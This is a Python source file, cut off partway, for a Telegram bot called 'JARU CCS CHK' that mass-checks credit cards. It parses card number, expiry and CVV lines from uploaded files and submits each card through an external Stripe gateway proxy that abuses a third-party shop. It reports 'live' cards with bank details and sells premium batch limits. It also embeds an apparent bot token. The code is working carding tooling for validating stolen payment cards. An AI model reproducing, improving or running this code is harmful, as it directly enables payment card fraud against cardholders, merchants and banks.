import logging
import sqlite3
import time
import requests
import re
import random
import string
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackContext, CallbackQueryHandler, MessageHandler, filters
from datetime import datetime, timedelta

# Bot Configuration
TOKEN = "8342685852:AAFsgk4ffHCqili2NZ3GfQxIm2FfalNSLhs" #Cambiar por tu token
OWNER_ID = 7579477811 #ID TELEGRAM
Seller_ID = 6455287491 #ID TELEGRAM

# User Limits and Cooldowns
FREE_LIMIT = 50
PREMIUM_LIMIT = 600
OWNER_LIMIT = 5000
COOLDOWN_TIME = 100  # 5 minutes

# Store user files in memory
user_files = {}
active_checks = {}
stop_controllers = {}

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# STOP CONTROLLER CLASS
class MassCheckController:
    def __init__(self, user_id):
        self.user_id = user_id
        self.should_stop = False
        self.last_check_time = time.time()
        self.active = True
    
    def stop(self):
        self.should_stop = True
        self.active = False
        logger.info(f"FORCE STOPPED for user {self.user_id}")
    
    def should_continue(self):
        self.last_check_time = time.time()
        return not self.should_stop and self.active

# Initialize database
def init_db():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY, status TEXT, cooldown_until REAL, join_date REAL)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS premium_codes
                 (code TEXT PRIMARY KEY, days INTEGER, created_at REAL, used_by INTEGER)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS redeemed
                 (user_id INTEGER, code TEXT, redeemed_at REAL, expires_at REAL)''')
    
    c.execute("INSERT OR IGNORE INTO users (user_id, status, join_date) VALUES (?, ?, ?)",
              (OWNER_ID, "owner", time.time()))
    
    conn.commit()
    conn.close()

# User management functions
def get_user_status(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    c.execute("SELECT status FROM users WHERE user_id=?", (user_id,))
    result = c.fetchone()
    
    if not result:
        c.execute("INSERT INTO users (user_id, status, join_date) VALUES (?, ?, ?)",
                  (user_id, "free", time.time()))
        conn.commit()
        status = "free"
    else:
        status = result[0]
    
    if status == "premium":
        c.execute("SELECT expires_at FROM redeemed WHERE user_id=?", (user_id,))
        expiry = c.fetchone()
        if expiry and time.time() > expiry[0]:
            c.execute("UPDATE users SET status='free' WHERE user_id=?", (user_id,))
            conn.commit()
            status = "free"
    
    conn.close()
    return status

def get_user_limit(user_id):
    status = get_user_status(user_id)
    if user_id == OWNER_ID:
        return OWNER_LIMIT
    elif status == "premium":
        return PREMIUM_LIMIT
    else:
        return FREE_LIMIT

def is_on_cooldown(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    c.execute("SELECT cooldown_until FROM users WHERE user_id=?", (user_id,))
    result = c.fetchone()
    
    conn.close()
    
    if result and result[0]:
        return time.time() < result[0]
    return False

def set_cooldown(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    cooldown_until = time.time() + COOLDOWN_TIME
    c.execute("UPDATE users SET cooldown_until=? WHERE user_id=?", (cooldown_until, user_id))
    
    conn.commit()
    conn.close()

# SIMPLE CC PARSER
def simple_cc_parser(text):
    valid_ccs = []
    
    patterns = [
        r'(\d{13,19})[\|/\s:\-]+(\d{1,2})[\|/\s:\-]+(\d{2,4})[\|/\s:\-]+(\d{3,4})',
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, text)
        for match in matches:
            cc, month, year, cvv = match
            
            if len(cc) < 13 or len(cc) > 19:
                continue
                
            month = month.zfill(2)
            if len(year) == 2:
                year = "20" + year
                
            if cc.startswith(('34', '37')):
                if len(cvv) != 4:
                    continue
            else:
                if len(cvv) != 3:
                    continue
                    
            valid_ccs.append((cc, month, year, cvv))
    
    return valid_ccs

def detect_card_type(cc_number):
    if re.match(r'^4[0-9]{12}(?:[0-9]{3})?$', cc_number):
        return "VISA"
    elif re.match(r'^5[1-5][0-9]{14}$', cc_number):
        return "MASTERCARD"
    elif re.match(r'^3[47][0-9]{13}$', cc_number):
        return "AMEX"
    elif re.match(r'^6(?:011|5[0-9]{2})[0-9]{12}$', cc_number):
        return "DISCOVER"
    elif re.match(r'^3(?:0[0-5]|[68][0-9])[0-9]{11}$', cc_number):
        return "DINERS CLUB"
    elif re.match(r'^(?:2131|1800|35\d{3})\d{11}$', cc_number):
        return "JCB"
    else:
        return "UNKNOWN"

# BIN Lookup function
def bin_lookup(bin_number):
    try:
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=10)
        if response.status_code == 200:
            return response.json()
    except Exception as e:
        logger.error(f"BIN lookup error: {e}")
    return None

# CC Check function
def check_cc(cc_number, month, year, cvv):
    start_time = time.time()
    
    cc_data = f"{cc_number}|{month}|{year}|{cvv}"
    
    url = f"https://stripe.stormx.pw/gateway=autostripe/key=darkboy/site=www.realoutdoorfood.shop/cc={cc_data}"
    
    try:
        response = requests.get(url, timeout=35)
        end_time = time.time()
        process_time = round(end_time - start_time, 2)
        
        if response.status_code == 200:
            response_text = response.text
            
            approved_keywords = ['approved', 'success', 'charged', 'payment added', 'live', 'valid']
            declined_keywords = ['declined', 'failed', 'invalid', 'error', 'dead']
            
            response_lower = response_text.lower()
            
            if any(keyword in response_lower for keyword in approved_keywords):
                return "approved", process_time, response_text
            elif any(keyword in response_lower for keyword in declined_keywords):
                return "declined", process_time, response_text
            else:
                if len(response_text.strip()) > 5:
                    return "approved", process_time, response_text
                else:
                    return "declined", process_time, response_text
        else:
            return "declined", process_time, f"HTTP Error {response.status_code}"
            
    except requests.exceptions.Timeout:
        return "error", 0, "Request Timeout (35s)"
    except requests.exceptions.ConnectionError:
        return "error", 0, "Connection Error"
    except Exception as e:
        return "error", 0, f"API Error: {str(e)}"

# FILE PARSER
def parse_cc_file(file_content):
    try:
        if isinstance(file_content, (bytes, bytearray)):
            text_content = file_content.decode('utf-8', errors='ignore')
        else:
            text_content = str(file_content)
        
        valid_ccs = simple_cc_parser(text_content)
        
        formatted_ccs = [f"{cc}|{month}|{year}|{cvv}" for cc, month, year, cvv in valid_ccs]
        
        return formatted_ccs
        
    except Exception as e:
        logger.error(f"File parsing error: {e}")
        return []

# === IMPROVED DESIGN - BUTTON SYSTEM ===
def create_main_menu_buttons():
    keyboard = [
        [InlineKeyboardButton("💳 CHECK CC", callback_data="single_check")],
        [InlineKeyboardButton("📁 MASS CHECK", callback_data="mass_check")],
        [InlineKeyboardButton("💎 PREMIUM SYSTEM", callback_data="premium_system")],
        [InlineKeyboardButton("📊 STATISTICS", callback_data="user_stats")],
        [InlineKeyboardButton("❓ HELP GUIDE", callback_data="help_menu")]
    ]
    return InlineKeyboardMarkup(keyboard)

def create_check_buttons(user_id, current_cc, status, approved_count, declined_count, checked_count, total_to_check):
    keyboard = [
        [InlineKeyboardButton(f"💳 Card {current_cc[:8]}", callback_data="current_info")],
        [InlineKeyboardButton(f"📊 Status {status}", callback_data="status_info")],
        [InlineKeyboardButton(f"✅ Approved {approved_count}", callback_data="approved_info")],
        [InlineKeyboardButton(f"❌ Declined {declined_count}", callback_data="declined_info")],
        [InlineKeyboardButton(f"📈 Progress {checked_count}/{total_to_check}", callback_data="progress_info")],
        [InlineKeyboardButton("🛑 STOP", callback_data=f"stop_check_{user_id}")]
    ]
    return InlineKeyboardMarkup(keyboard)

def create_premium_buttons():
    keyboard = [
        [InlineKeyboardButton("🎁 GENERATE CODE", callback_data="generate_code")],
        [InlineKeyboardButton("🔓 REDEEM CODE", callback_data="redeem_code")],
        [InlineKeyboardButton("📋 MY CODES", callback_data="my_codes")],
        [InlineKeyboardButton("⬅️ BACK", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(keyboard)

def create_back_button(target_menu):
    keyboard = [
        [InlineKeyboardButton("⬅️ BACK", callback_data=target_menu)]
    ]
    return InlineKeyboardMarkup(keyboard)

# === MAIN CALLBACK HANDLER ===
async def handle_button(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id
    callback_data = query.data
    
    await query.answer()
    
    logger.info(f"Button pressed: {callback_data} by user {user_id}")
    
    if callback_data == "main_menu":
        await show_main_menu(query)
    
    elif callback_data == "single_check":
        await show_single_check_menu(query)
    
    elif callback_data == "mass_check":
        await show_mass_check_menu(query)
    
    elif callback_data == "premium_system":
        await show_premium_menu(query, user_id)
    
    elif callback_data == "user_stats":
        await show_user_stats(query, user_id)
    
    elif callback_data == "help_menu":
        await show_help_menu(query)
    
    elif callback_data == "generate_code":
        await show_generate_code_menu(query, user_id)
    
    elif callback_data == "redeem_code":
        await show_redeem_code_menu(query)
    
    elif callback_data == "my_codes":
        await show_my_codes_menu(query, user_id)
    
    elif callback_data == "upload_file":
        await show_upload_instructions(query)
    
    elif callback_data == "start_single_check":
        await show_single_check_instructions(query)
    
    elif callback_data == "tutorial":
        await show_tutorial_menu(query)
    
    elif callback_data == "guide_format":
        await show_format_guide(query)
    
    elif callback_data == "guide_limits":
        await show_limits_guide(query)
    
    elif callback_data == "guide_premium":
        await show_premium_guide(query)
    
    elif callback_data.startswith('start_check_'):
        target_user_id = int(callback_data.split('_')[2])
        if user_id != target_user_id:
            await query.message.reply_text("❌ This is not your file!")
            return
        await start_card_check(query, context, user_id)
    
    elif callback_data.startswith('stop_check_'):
        target_user_id = int(callback_data.split('_')[2])
        if user_id != target_user_id:
            await query.answer("❌ This is not your check!", show_alert=True)
            return
        
        stop_success = False
        if target_user_id in stop_controllers:
            stop_controllers[target_user_id].stop()
            stop_success = True
        if target_user_id in active_checks:
            active_checks[target_user_id] = False
            stop_success = True
        if target_user_id in user_files:
            user_files[target_user_id]['force_stop'] = True
            stop_success = True
        
        if stop_success:
            await query.edit_message_text(
                "<b>🛑 EMERGENCY STOP ACTIVATED!</b>\n\n"
                "✅ Verification process terminated immediately!\n"
                "📊 All resources released!\n"
                "🔧 Ready to upload a new file!",
                parse_mode='HTML'
            )
        else:
            await query.answer("❌ No active verification found to stop!", show_alert=True)
    
    elif callback_data.startswith('cancel_check_'):
        target_user_id = int(callback_data.split('_')[2])
        if user_id != target_user_id:
            await query.message.reply_text("❌ This is not your file!")
            return
        if user_id in user_files:
            del user_files[user_id]
        await query.edit_message_text("❌ <b>Verification cancelled!</b>", parse_mode='HTML')

# === MENU DISPLAY FUNCTIONS ===
async def show_main_menu(query):
    user_id = query.from_user.id
    user_status = get_user_status(user_id)
    user_limit = get_user_limit(user_id)
    now = datetime.now()
    current_time = now.strftime("%H:%M:%S")
    current_date = now.strftime("%d/%m/%Y")
    
    welcome_text = f"""
<b>⛅️ JARU CCS CHK</b> ↯

[「✰」 <b>🚀 MAIN PANEL</b> 「✰」]

⌥ <code>Advanced credit card verification system</code>

<code>Status: {user_status.upper()} | Limit: {user_limit} CCs</code>
<code>ID: {user_id} | Time: {current_time}</code>

[「✰」 <b>Bot Status</b> ⬌ <code>Online 🟢</code>]
    """
    
    await query.edit_message_text(
        welcome_text,
        reply_markup=create_main_menu_buttons(),
        parse_mode='HTML'
    )

async def show_single_check_menu(query):
    text = """
[✰ <b>💳 𝗩𝗲𝗿𝗶𝗳𝗶𝗰𝗮𝗰𝗶𝗼𝗻 𝗶𝗻𝗱𝗶𝘃𝗶𝗱𝘂𝗮𝗹</b> ✰]

⌥ <code>𝗩𝗲𝗿𝗶𝗳𝗶𝗰𝗮𝗿 𝘂𝗻𝗮 𝘀𝗼𝗹𝗮 𝘁𝗮𝗿𝗷𝗲𝘁𝗮 𝗱𝗲 𝗰𝗿𝗲𝗱𝗶𝘁𝗼</code>

<code>Accepted formats:</code>
<code>「✰」 4147768578745265|04|2026|168</code>
<code>「✰」 5154620012345678|05|2027|123</code>

<code>Use command: /chk CC|MM|YYYY|CVV</code>
    """
    
    keyboard = [
        [InlineKeyboardButton("🔍 CHECK NOW", callback_data="start_single_check")],
        [InlineKeyboardButton("📚 FORMAT GUIDE", callback_data="guide_format")],
        [InlineKeyboardButton("⬅️ BACK", callback_data="main_menu")]
    ]
    
    await query.edit_message_text(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='HTML'
    )

async def show_single_check_instructions(query):
    text = """
<b>🔍 𝗩𝗲𝗿𝗶𝗳𝗶𝗰𝗮𝗰𝗶𝗼𝗻 𝗶𝗻𝗱𝗶𝘃𝗶𝗱𝘂𝗮𝗹 INSTRUCTIONS</b>
━━━━━━━━
<code>To check a single card, use:</code>
<code>/chk 4147768578745265|04|2026|168</code>

<code>Or send the card in this format:</code>
<code>4147768578745265|04|2026|168</code>

<code>The bot will automatically detect</code>
<code>and verify the card.</code>
━━━━━━━━
    """
    
    await query.edit_message_text(
        text,
        reply_markup=create_back_button("single_check"),
        parse_mode='HTML'
    )

async def show_mass_check_menu(query):
    text = f"""
[「✰」 <b>📁 MASS CHECK</b> 「✰」]

⌥ <code>Verify multiple cards from a file</code>

<code>Instructions:</code>
<code>1. Upload a .txt file</code>
<code>2. Bot will automatically detect CCs</code>
<code>3. Click verification button</code>
<code>4. Monitor progress in real time</code>

<code>User limits:</code>
<code>「✰」 Free: {FREE_LIMIT} CCs</code>
<code>「✰」 Premium: {PREMIUM_LIMIT} CCs</code>
    """
    
    keyboard = [
        [InlineKeyboardButton("📤 UPLOAD FILE", callback_data="upload_file")],
        [InlineKeyboardButton("📚 LIMITS GUIDE", callback_data="guide_limits")],
        [InlineKeyboardButton("⬅️ BACK", callback_data="main_menu")]
    ]
    
    await query.edit_message_text(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='HTML'
    )

async def show_upload_instructions(query):
    text = """
<b>📤 FILE UPLOAD INSTRUCTIONS</b>
━━━━━━━━
<code>1. Prepare your .txt file</code>
<code>2. Each line should contain one CC</code>
<code>3. Supported formats:</code>
<code>   「✰」 4147768578745265|04|2026|168</code>
<code>   「✰」 5154620012345678|05|2027|123</code>
<code>4. Click "Upload File" in Telegram</code>
<code>5. Select your .txt file</code>
<code>6. Wait for processing</code>
<code>7. Click verification button</code>
━━━━━━━━
    """
    
    await query.edit_message_text(
        text,
        reply_markup=create_back_button("mass_check"),
        parse_mode='HTML'
    )

async def show_premium_menu(query, user_id):
    user_status = get_user_status(user_id)
    
    text = f"""
[「✰」 <b>💎 PREMIUM SYSTEM</b> 「✰」]

⌥ <code>Upgrade your experience with Premium</code>

<code>Your Status: {user_status.upper()}</code>

<b>Premium Benefits:</b>
<code>「✰」 Limit increased to {PREMIUM_LIMIT} CCs</code>
<code>「✰」 Priority processing</code>
<code>「✰」 No ads</code>
<code>「✰」 Priority support</code>

<b>Available Commands:</b>
<code>/code days - Generate code (Owner)</code>
<code>/redeem code - Activate premium</code>
    """
    
    await query.edit_message_text(
        text,
        reply_markup=create_premium_buttons(),
        parse_mode='HTML'
    )

async def show_user_stats(query, user_id):
    user_status = get_user_status(user_id)
    user_limit = get_user_limit(user_id)
    
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users")
    total_users = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM users WHERE status='premium'")
    premium_users = c.fetchone()[0]
    conn.close()
    
    text = f"""
[「✰」 <b>📊 STATISTICS</b> 「✰」]

<code>👤 Your Data:</code>
<code>「✰」 ID: {user_id}</code>
<code>「✰」 Status: {user_status.upper()}</code>
<code>「✰」 Limit: {user_limit} CCs</code>

<code>📈 Global Statistics:</code>
<code>「✰」 Total Users: {total_users}</code>
<code>「✰」 Premium Users: {premium_users}</code>
<code>「✰」 Free Users: {total_users - premium_users}</code>

<code>⚡ Rylax Checker System</code>
    """
    
    keyboard = [
        [InlineKeyboardButton("🔄 REFRESH", callback_data="user_stats")],
        [InlineKeyboardButton("⬅️ BACK", callback_data="main_menu")]
    ]
    
    await query.edit_message_text(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='HTML'
    )

async def show_help_menu(query):
    text = """
<b>❓ HELP GUIDE - GUÍA EN ESPAÑOL</b>
━━━━━━━━
<b>🇪🇸 GUÍA COMPLETA DE USO:</b>

<code>📋 VERIFICACIÓN INDIVIDUAL:</code>
<code>「✰」 Usa /chk CC|MM|AAAA|CVV</code>
<code>「✰」 Ejemplo: /chk 4147768578745265|04|2026|168</code>

<code>📁 VERIFICACIÓN MASIVA:</code>
<code>「✰」 Sube archivo .txt con CCs</code>
<code>「✰」 Formato: una CC por línea</code>
<code>「✰」 Límite Free: {FREE_LIMIT} CCs</code>
<code>「✰」 Límite Premium: {PREMIUM_LIMIT} CCs</code>

<code>💎 SISTEMA PREMIUM:</code>
<code>「✰」 /redeem CÓDIGO - Activar premium</code>
<code>「✰」 Beneficios: Mayor límite, prioridad</code>

<code>⚡ COMANDOS RÁPIDOS:</code>
<code>「✰」 .start - Menú principal</code>
<code>「✰」 .chk - Verificar tarjeta</code>
<code>「✰」 .id - Tu ID de usuario</code>
━━━━━━━━
    """.format(FREE_LIMIT=FREE_LIMIT, PREMIUM_LIMIT=PREMIUM_LIMIT)
    
    keyboard = [
        [InlineKeyboardButton("📚 TUTORIAL", callback_data="tutorial")],
        [InlineKeyboardButton("🔄 ACTUALIZAR", callback_data="help_menu")],
        [InlineKeyboardButton("⬅️ BACK", callback_data="main_menu")]
    ]
    
    await query.edit_message_text(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='HTML'
    )

async def show_tutorial_menu(query):
    text = """
<b>📚 TUTORIAL COMPLETO - ESPAÑOL</b>
━━━━━━━━
<code>🇪🇸 PASO A PASO:</code>

<code>1. VERIFICACIÓN INDIVIDUAL:</code>
<code>   「✰」 Usa /chk o .chk</code>
<code>   「✰」 Ejemplo: .chk 4147768578745265|04|2026|168</code>

<code>2. VERIFICACIÓN MASIVA:</code>
<code>   「✰」 Prepara archivo .txt</code>
<code>   「✰」 Una CC por línea</code>
<code>   「✰」 Sube el archivo al bot</code>
<code>   「✰」 Haz clic en "VERIFICAR"</code>

<code>3. GESTIÓN DE LÍMITES:</code>
<code>   「✰」 Free: {FREE_LIMIT} CCs por verificación</code>
<code>   「✰」 Premium: {PREMIUM_LIMIT} CCs por verificación</code>
<code>   「✰」 Cooldown: 5 minutos entre verificaciones</code>

<code>4. RESULTADOS:</code>
<code>   「✰」 ✅ Approved - Tarjetas vivas</code>
<code>   「✰」 ❌ Declined - Tarjetas muertas</code>
<code>   「✰」 ⏱️ Tiempo de procesamiento</code>
━━━━━━━━
<code>¿Necesitas más ayuda? Contacta al soporte.</code>
    """.format(FREE_LIMIT=FREE_LIMIT, PREMIUM_LIMIT=PREMIUM_LIMIT)
    
    keyboard = [
        [InlineKeyboardButton("📋 FORMATOS", callback_data="guide_format")],
        [InlineKeyboardButton("📊 LÍMITES", callback_data="guide_limits")],
        [InlineKeyboardButton("💎 PREMIUM", callback_data="guide_premium")],
        [InlineKeyboardButton("⬅️ BACK", callback_data="help_menu")]
    ]
    
    await query.edit_message_text(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='HTML'
    )

async def show_format_guide(query):
    text = """
<b>📋 GUÍA DE FORMATOS - ESPAÑOL</b>
━━━━━━━━
<code>🇪🇸 FORMATOS ACEPTADOS:</code>

<code>✅ FORMATOS VÁLIDOS:</code>
<code>「✰」 4147768578745265|04|2026|168</code>
<code>「✰」 5154620012345678|05|2027|123</code>
<code>「✰」 371449635398431|12|2025|1234</code>

<code>❌ FORMATOS NO VÁLIDOS:</code>
<code>「✰」 4147 7685 7874 5265 04 2026 168</code>
<code>「✰」 4147768578745265,04,2026,168</code>
<code>「✰」 4147768578745265-04-2026-168</code>

<code>💡 RECOMENDACIONES:</code>
<code>「✰」 Usa siempre el carácter "|" como separador</code>
<code>「✰」 Mes en 2 dígitos (04, 12)</code>
<code>「✰」 Año en 4 dígitos (2026, 2027)</code>
<code>「✰」 CVV: 3 dígitos (4 para AMEX)</code>
━━━━━━━━
    """
    
    await query.edit_message_text(
        text,
        reply_markup=create_back_button("tutorial"),
        parse_mode='HTML'
    )

async def show_limits_guide(query):
    text = """
<b>📊 GUÍA DE LÍMITES - ESPAÑOL</b>
━━━━━━━━
<code>🇪🇸 SISTEMA DE LÍMITES:</code>

<code>👤 USUARIO FREE:</code>
<code>「✰」 {FREE_LIMIT} CCs por verificación</code>
<code>「✰」 Cooldown: 5 minutos</code>
<code>「✰」 Procesamiento estándar</code>

<code>💎 USUARIO PREMIUM:</code>
<code>「✰」 {PREMIUM_LIMIT} CCs por verificación</code>
<code>「✰」 Cooldown: 5 minutos</code>
<code>「✰」 Procesamiento prioritario</code>
<code>「✰」 Sin anuncios</code>

<code>👑 USUARIO OWNER:</code>
<code>「✰」 {OWNER_LIMIT} CCs por verificación</code>
<code>「✰」 Sin cooldown</code>
<code>「✰」 Acceso total</code>

<code>⏰ COOLDOWN SYSTEM:</code>
<code>「✰」 Tiempo de espera entre verificaciones</code>
<code>「✰」 Evita spam y sobrecarga</code>
<code>「✰」 5 minutos para todos los usuarios</code>
━━━━━━━━
    """.format(FREE_LIMIT=FREE_LIMIT, PREMIUM_LIMIT=PREMIUM_LIMIT, OWNER_LIMIT=OWNER_LIMIT)
    
    await query.edit_message_text(
        text,
        reply_markup=create_back_button("tutorial"),
        parse_mode='HTML'
    )

async def show_premium_guide(query):
    text = """
<b>💎 GUÍA PREMIUM - ESPAÑOL</b>
━━━━━━━━
<code>🇪🇸 VENTAJAS PREMIUM:</code>

<code>🚀 MAYOR LÍMITE:</code>
<code>「✰」 Free: {FREE_LIMIT} CCs → Premium: {PREMIUM_LIMIT} CCs</code>
<code>「✰」 +100% de capacidad</code>

<code>⚡ PRIORIDAD:</code>
<code>「✰」 Procesamiento más rápido</code>
<code>「✰」 Menos tiempo de espera</code>
<code>「✰」 Mayor estabilidad</code>

<code>🎯 SIN RESTRICCIONES:</code>
<code>「✰」 Sin anuncios</code>
<code>「✰」 Soporte prioritario</code>
<code>「✰」 Acceso a nuevas funciones</code>

<code>🔓 CÓMO ACTIVAR:</code>
<code>1. Obtén un código premium</code>
<code>2. Usa /redeem CÓDIGO</code>
<code>3. Disfruta de los beneficios</code>

<code>📅 DURACIÓn:</code>
<code>「✰」 Códigos de 7, 15, 30, 90 días</code>
<code>「✰」 Renovación automática</code>
<code>「✰」 Recordatorio antes de expirar</code>
━━━━━━━━
    """.format(FREE_LIMIT=FREE_LIMIT, PREMIUM_LIMIT=PREMIUM_LIMIT)
    
    await query.edit_message_text(
        text,
        reply_markup=create_back_button("tutorial"),
        parse_mode='HTML'
    )

async def show_generate_code_menu(query, user_id):
    if user_id != OWNER_ID:
        await query.answer("❌ Only owner can generate codes!", show_alert=True)
        return
    
    text = """
[「✰」 <b>🎁 GENERATE PREMIUM CODE</b> 「✰」]

⌥ <code>Generate premium codes for users</code>

<code>Use command: /code days</code>
<code>Example: /code 30</code>

<code>Generated code can be redeemed</code>
<code>by any user using /redeem</code>
    """
    
    keyboard = [
        [InlineKeyboardButton("⬅️ BACK", callback_data="premium_system")]
    ]
    
    await query.edit_message_text(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='HTML'
    )

async def show_redeem_code_menu(query):
    text = f"""
[「✰」 <b>🔓 REDEEM CODE</b> 「✰」]

⌥ <code>Activate your premium code</code>

<code>Use command: /redeem CODE</code>
<code>Example: /redeem ABC123XY</code>

<code>Premium codes give you:</code>
<code>「✰」 Limit increased to {PREMIUM_LIMIT} CCs</code>
<code>「✰」 Priority processing</code>
<code>「✰」 No waiting times</code>
    """
    
    keyboard = [
        [InlineKeyboardButton("⬅️ BACK", callback_data="premium_system")]
    ]
    
    await query.edit_message_text(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='HTML'
    )

async def show_my_codes_menu(query, user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    c.execute("""
        SELECT code, redeemed_at, expires_at 
        FROM redeemed 
        WHERE user_id=? 
        ORDER BY redeemed_at DESC
    """, (user_id,))
    
    codes = c.fetchall()
    conn.close()
    
    if not codes:
        text = """
[「✰」 <b>📋 MY CODES</b> 「✰」]

<code>No premium codes redeemed yet.</code>

<code>Use /redeem CODE to activate</code>
<code>a premium code and enjoy benefits!</code>
        """
    else:
        text = "[「✰」 <b>📋 MY REDEEMED CODES</b> 「✰」]\n\n"
        for code, redeemed_at, expires_at in codes:
            redeemed_date = datetime.fromtimestamp(redeemed_at).strftime("%Y-%m-%d")
            expires_date = datetime.fromtimestamp(expires_at).strftime("%Y-%m-%d")
            status = "🟢 ACTIVE" if time.time() < expires_at else "🔴 EXPIRED"
            
            text += f"<code>「✰」 {code} | {redeemed_date} → {expires_date} | {status}</code>\n"
    
    keyboard = [
        [InlineKeyboardButton("⬅️ BACK", callback_data="premium_system")]
    ]
    
    await query.edit_message_text(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='HTML'
    )

# === ORIGINAL FUNCTIONS MAINTAINED ===
async def handle_document(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please upload a .txt file!")
        return
    
    try:
        await update.message.reply_text("All CCs are being verified... bot by @SoyJaruTsb")
        file = await document.get_file()
        file_content = await file.download_as_bytearray()
        
        cc_list = parse_cc_file(file_content)
        total_ccs = len(cc_list)
        
        if total_ccs == 0:
            await update.message.reply_text(
                "<b>❌ No valid CCs found in the file!</b>\n\n"
                "Make sure your file contains CCs in this format:\n"
                "<code>4147768578745265|04|2026|168</code>\n"
                "<code>5154620012345678|05|2027|123</code>\n"
                "<code>371449635398431|12|2025|1234</code>",
                parse_mode='HTML'
            )
            return
        
        user_files[user_id] = {
            'cc_list': cc_list,
            'file_name': document.file_name,
            'total_ccs': total_ccs,
            'timestamp': time.time()
        }
        
        user_limit = get_user_limit(user_id)
        
        keyboard = [
            [InlineKeyboardButton("🚀 VERIFY CCS", callback_data=f"start_check_{user_id}")],
            [InlineKeyboardButton("❌ CANCEL", callback_data=f"cancel_check_{user_id}")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        message_text = f"""
<b>📁 FILE PROCESSED SUCCESSFULLY</b>
━━━━━━━━
<b>「✰」 Name:</b> <code>{document.file_name}</code>
<b>「✰」 CCs Found:</b> <code>{total_ccs}</code>
<b>「✰」 Your Limit:</b> <code>{user_limit}</code>
━━━━━━━━
<code>API: @SoyJaruTsb</code>
        """
        
        await update.message.reply_text(message_text, reply_markup=reply_markup, parse_mode='HTML')
        
    except Exception as e:
        logger.error(f"Document handling error: {e}")
        await update.message.reply_text(f"❌ Error processing file: {str(e)}")

# COMPLETE MASS CHECK FUNCTION
async def start_card_check(query, context: CallbackContext, user_id: int):
    if user_id not in user_files:
        await query.edit_message_text("❌ File data not found! Please upload it again.")
        return
    
    if is_on_cooldown(user_id):
        await query.edit_message_text("⏳ <b>AntiSpam active!</b> Wait 5 minutes between mass verifications.", parse_mode='HTML')
        return
    
    file_data = user_files[user_id]
    cc_list = file_data['cc_list']
    total_ccs = file_data['total_ccs']
    user_limit = get_user_limit(user_id)
    total_to_check = min(total_ccs, user_limit)
    
    set_cooldown(user_id)
    
    stop_controller = MassCheckController(user_id)
    stop_controllers[user_id] = stop_controller
    active_checks[user_id] = True
    user_files[user_id]['force_stop'] = False
    
    status_text = "<b>Mass CC verification started!</b>\n\n"
    reply_markup = create_check_buttons(
        user_id=user_id,
        current_cc="Starting...",
        status="Initializing",
        approved_count=0,
        declined_count=0,
        checked_count=0,
        total_to_check=total_to_check
    )
    
    status_msg = await query.edit_message_text(status_text, reply_markup=reply_markup)
    
    approved_count = 0
    declined_count = 0
    checked_count = 0
    approved_ccs = []
    
    start_time = time.time()
    
    for index, cc_data in enumerate(cc_list[:user_limit]):
        if not stop_controller.should_continue():
            logger.info(f"Stop controller triggered for user {user_id}")
            break
            
        if user_id not in active_checks or not active_checks[user_id]:
            logger.info(f"Active checks flag stopped for user {user_id}")
            break
            
        if user_id in user_files and user_files[user_id].get('force_stop', False):
            logger.info(f"Force stop flag triggered for user {user_id}")
            break
            
        checked_count = index + 1
        
        try:
            cc_number, month, year, cvv = cc_data.split('|')
            card_type = detect_card_type(cc_number)
            
            status_text = "Checking CCs one by one...\n\n"
            reply_markup = create_check_buttons(
                user_id=user_id,
                current_cc=cc_number,
                status="Checking...",
                approved_count=approved_count,
                declined_count=declined_count,
                checked_count=checked_count,
                total_to_check=total_to_check
            )
            
            try:
                await status_msg.edit_text(status_text, reply_markup=reply_markup)
            except Exception as e:
                logger.error(f"Message edit error: {e}")
            
            if (not stop_controller.should_continue() or 
                user_id not in active_checks or 
                not active_checks[user_id] or
                (user_id in user_files and user_files[user_id].get('force_stop', False))):
                break
                
            status, process_time, api_response = check_cc(cc_number, month, year, cvv)
            
            if (not stop_controller.should_continue() or 
                user_id not in active_checks or 
                not active_checks[user_id] or
                (user_id in user_files and user_files[user_id].get('force_stop', False))):
                break
                
            if status == "approved":
                approved_count += 1
                bin_info = bin_lookup(cc_number[:6])
                
                approved_text = f"""
<b>#𝗝 𝗔 𝗥 𝗨 𝗖 𝗛 𝗞 - 𝗦𝘁𝗿𝗶𝗽𝗲 𝗠𝗮𝘀𝘀</b>
━━━━━━━━
<b>「✰」</b> <code>{cc_number}|{month}|{year}|{cvv}</code>
<b>「✰」 Status ⬌</b> <b><i>Approved</i></b> ✅
<b>「✰」 Response ⬌</b> <code>(Payment added successfully)</code>

<b>「✰」 More ⬌</b> <code> {bin_info.get('brand', 'N/A')} - {bin_info.get('type', 'N/A')}</code>
<b>「✰」 Bank ⬌</b> <code>{bin_info.get('bank', 'N/A')}</code>
